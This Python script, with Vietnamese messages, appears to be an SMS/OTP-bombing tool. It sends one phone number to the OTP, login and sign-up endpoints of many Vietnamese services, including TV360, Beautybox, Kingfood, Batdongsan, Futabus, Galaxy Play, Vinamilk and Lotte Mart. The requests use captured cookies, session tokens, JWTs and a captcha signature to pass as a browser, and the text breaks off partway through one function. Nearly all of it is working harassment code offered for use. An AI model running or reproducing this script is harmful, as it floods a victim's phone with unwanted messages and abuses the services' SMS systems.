import requests
import time
import sys

if len(sys.argv) != 3:
    print("Số lượng tham số không đúng")
    sys.exit()

sdt = sys.argv[1]
other_param = sys.argv[2]

print("Số điện thoại:", sdt)
print("Tham số khác:", other_param)

def sdtt(sdt):
    if sdt.startswith("0"):
        return "+84" + sdt[1:]
    return sdt

sdt_chuyen_doi = sdtt(sdt)

def tv360():
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk; shared-device-id=web_d113a986-bdb0-45cd-9638-827d1a7809bb; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; access-token=; refresh-token=; msisdn=; profile=; user-id=; session-id=s%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM; G_ENABLED_IDPS=google',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    try:
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TV360 | TRẠNG THÁI : THẤT BẠI")

def beautybox():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '79d2b3f19c99f5f7fe5971dd8a8da10d',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721481506061',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEAUTYBOX | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEAUTYBOX | TRẠNG THÁI : THẤT BẠI")
def kingfood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'AUh02gdJ2znItu66xz2_9BcBV9GpEJnBt2TLRjQR8E4oYUM8MOUaIzo9UIbYoR5iYCS1tFCgV-bXXo5aAhc4PphZgiMyaaKDNeC4MNyVDT5ME4_Sd-u0oY1gNPGS74QJAiRCJQ3aFU55oFpZpvKGID_msRlD:U=830229ce60000000',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    try:
        response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KINGFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KINGFOOD | TRẠNG THÁI : THẤT BẠI")

def batdongsan():
    cookies = {
        'con.ses.id': '7bf95af0-9d48-4115-b90e-bf7ae8469ee6',
        'con.unl.lat': '1721408400',
        'con.unl.sc': '1',
        '_cfuvid': '4vKd4xe7hwURYq2xLeT9BVK.Jrz4BnjQuSRDUOM0vzA-1721486111747-0.0.1.1-604800000',
        'cf_clearance': 'hiiEURQk2w.xUsuPjn9p3ROpbHXl.wlpUuq1cGtW_.g-1721486121-1.0.1.1-jbLYMcgpNKMTvY1HlNdTJzo8ICADE9v86yOh5Ulh15Xm.v0xqMTTlj15qkFRfERjSleLaNdqxOJCQTsz.cc7cA',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222072e9e1-089b-4e58-ae37-b33dc853a67e%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.6810435Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2264679f44-f457-480b-ad8d-ce4e4c2ee26d%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.681077Z%22%7D',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%22171c86d6-ae5f-e545-06ab-337ff9c892a2%22%2C%22c%22%3A1721486135674%2C%22l%22%3A1721486135674%7D',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'cookie': 'con.ses.id=7bf95af0-9d48-4115-b90e-bf7ae8469ee6; con.unl.lat=1721408400; con.unl.sc=1; _cfuvid=4vKd4xe7hwURYq2xLeT9BVK.Jrz4BnjQuSRDUOM0vzA-1721486111747-0.0.1.1-604800000; cf_clearance=hiiEURQk2w.xUsuPjn9p3ROpbHXl.wlpUuq1cGtW_.g-1721486121-1.0.1.1-jbLYMcgpNKMTvY1HlNdTJzo8ICADE9v86yOh5Ulh15Xm.v0xqMTTlj15qkFRfERjSleLaNdqxOJCQTsz.cc7cA; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222072e9e1-089b-4e58-ae37-b33dc853a67e%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.6810435Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2264679f44-f457-480b-ad8d-ce4e4c2ee26d%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.681077Z%22%7D; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22171c86d6-ae5f-e545-06ab-337ff9c892a2%22%2C%22c%22%3A1721486135674%2C%22l%22%3A1721486135674%7D',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.get(
            'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
            params=params,
            cookies=cookies,
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BATDONGSAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BATDONGSAN | TRẠNG THÁI : THẤT BẠI")

def futabus():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'priority': 'u=1, i',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImMxNTQwYWM3MWJiOTJhYTA2OTNjODI3MTkwYWNhYmU1YjA1NWNiZWMiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMTQ4NDE4NywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIxNDg0MTg3LCJleHAiOjE3MjE0ODc3ODcsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.B3N8aepeBJjblYxOhB3CWVrtNScR7v03lucgdln78cz2607XQDiYEOVWQ5ObwQkxfPrEEVrBNHeysfEffcXB0u2B2D6uEki1H1vKam3-ANzbMHQAuAHAsYdd8WJXaK-75tm4eQUtY9tkmdfbjTZqWY0J-_FylIIZ-KBTDIfxQObMFXdQvJNZ2eFwBFOG1-sV1z2xBLpzfHg94WwC21FAWGDh44UnrWoUTHHgUrUZH9y-y3SivWeln2Wl1VHoDjojJLq2ktO01JEmshb7K3zf9rloW8jTd-ZzHQzLEeqMbep8AUeqDslL7uHnz8AJ8V6udNxACirDi5dZ-4b6aj8uxA',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': '44099e14-f741-4900-892f-1e8d7634a953',
        'use_for': 'LOGIN',
    }

    try:
        response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FUTABUS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FUTABUS | TRẠNG THÁI : THẤT BẠI")

# def domino():
#     headers = {
#         'accept': 'application/json, text/plain, */*',
#         'accept-language': 'vi',
#         'content-type': 'application/json',
#         'dmn': 'DTPGDW',
#         'origin': 'https://dominos.vn',
#         'priority': 'u=1, i',
#         'referer': 'https://dominos.vn/?gad_source=1',
#         'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
#         'sec-ch-ua-mobile': '?0',
#         'sec-ch-ua-platform': '"Windows"',
#         'sec-fetch-dest': 'empty',
#         'sec-fetch-mode': 'cors',
#         'sec-fetch-site': 'same-origin',
#         'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
#         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
#     }

#     json_data = {
#         'phone_number': sdt,
#         'email': 'licehe9526@newcupon.com',
#         'type': 0,
#         'is_register': True,
#     }

#     response = requests.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data)
#     print(response.text)

# DOMINO LỖI 404:Bad Requests

def galaxyplay():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI2YzY0MTgxMi00OTk0LTQyN2EtOWU2Zi0zZjdkYjE4NDE3M2YiLCJkaWQiOiI5MjlmYWM4Zi1kMzIwLTQ4NGEtYjBlMi0zNzM3ZGFiYzc0MzAiLCJpcCI6IjE3MS4yMjQuMTc3LjI0OSIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8b3BlcmEiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNzIxNDg5MzMxLCJleHAiOjE3MzcwNDEzMzF9.BO2W7U4Y9QBrqv_Vhr34OlQ003dseXM5sOYsJPl1DK4',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GALAXYPLAY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GALAXYPLAY | TRẠNG THÁI : THẤT BẠI")

def hoangphuc():
    cookies = {
        'form_key': 'foYNoUTBeSb3u9Ky',
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'PHPSESSID': 'ac5e556aba621e003eea52e3ee2e7306',
        'form_key': 'foYNoUTBeSb3u9Ky',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-cache-sessid': 'true',
        'mst-cache-warmer-track': '1721490287753',
        'private_content_version': '49f632da2b3ba9baa44ac87e1acceb51',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=foYNoUTBeSb3u9Ky; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=ac5e556aba621e003eea52e3ee2e7306; form_key=foYNoUTBeSb3u9Ky; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1721490287753; private_content_version=49f632da2b3ba9baa44ac87e1acceb51',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjFkNWJkZWE3ODIzYTA1MmQiLCJ0ciI6IjNhZGMzYWRkODkyYzI1NzE2MjYxZTA1Mzg3NTI1OGRkIiwidGkiOjE3MjE0OTAzMTM0ODUsInRrIjoiMTMyMjg0MCJ9fQ==',
        'origin': 'https://hoang-phuc.com',
        'priority': 'u=1, i',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-3adc3add892c25716261e053875258dd-1d5bdea7823a052d-01',
        'tracestate': '1322840@nr=0-1-4173019-1120237972-1d5bdea7823a052d----1721490313485',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
    }

    try:
        response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOANGPHUC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOANGPHUC | TRẠNG THÁI : THẤT BẠI")

def gumac():
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GUMAC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUMAC | TRẠNG THÁI : THẤT BẠI")

def vinamilk():
    cookies = {
        'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e',
        '__cf_bm': 'eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ',
        'builderSessionId': 'b4ba9b33e12b4b4080e44f971f201bbd',
        'sca_fg_codes': '[]',
        'avadaIsLogin': '',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer null',
        'content-type': 'text/plain;charset=UTF-8',
        # 'cookie': 'ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e; __cf_bm=eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ; builderSessionId=b4ba9b33e12b4b4080e44f971f201bbd; sca_fg_codes=[]; avadaIsLogin=',
        'origin': 'https://new.vinamilk.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = f'{{"type":"register","phone":"{sdt}"}}'

    try:
        response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINAMILK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINAMILK | TRẠNG THÁI : THẤT BẠI")

def speedlotte():
    cookies = {
        '__Host-next-auth.csrf-token': '28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '__Host-next-auth.csrf-token=28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/vi-cgy',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'username': sdt,
        'case': 'register',
    }

    try:
        response = requests.post(
            'https://www.lottemart.vn/v1/p/mart/bos/vi_cgy/V1/mart-sms/sendotp',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SPEEDLOTTE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SPEEDLOTTE | TRẠNG THÁI : THẤT BẠI")

def medicare():
    cookies = {
        'SERVER': 'nginx2',
        'XSRF-TOKEN': 'eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0%3D',
        'medicare_session': 'eyJpdiI6Ii9Ma2NlZmZ1OVZPTDdxeitEOVVNT2c9PSIsInZhbHVlIjoiK0NhYXZtYjRBeHRwd1gvenMrblVGVEdrU0FKVW80bmptYnQvbHMzRzkvN1pyYjVmaEh3ZHdEYzlHb3V3djBvNjMyeTlKdUJzbTl0S2RwQkJwQkh0ejFrcEJXcnZUcGRDTEppdmp1MTJ6UDgzRk4zcUtKalpJVSt1RGhLdjd3OS8iLCJtYWMiOiI4ZjU1ZTZkNjc1NWM5Mjc3NjNkN2UxMTUzNWQ5YzUyYTY4N2I0NTQ1NTZiZWExOWViZjcwYjhmNWUxM2NlYjMyIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'SERVER=nginx2; XSRF-TOKEN=eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6Ii9Ma2NlZmZ1OVZPTDdxeitEOVVNT2c9PSIsInZhbHVlIjoiK0NhYXZtYjRBeHRwd1gvenMrblVGVEdrU0FKVW80bmptYnQvbHMzRzkvN1pyYjVmaEh3ZHdEYzlHb3V3djBvNjMyeTlKdUJzbTl0S2RwQkJwQkh0ejFrcEJXcnZUcGRDTEppdmp1MTJ6UDgzRk4zcUtKalpJVSt1RGhLdjd3OS8iLCJtYWMiOiI4ZjU1ZTZkNjc1NWM5Mjc3NjNkN2UxMTUzNWQ5YzUyYTY4N2I0NTQ1NTZiZWExOWViZjcwYjhmNWUxM2NlYjMyIiwidGFnIjoiIn0%3D',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
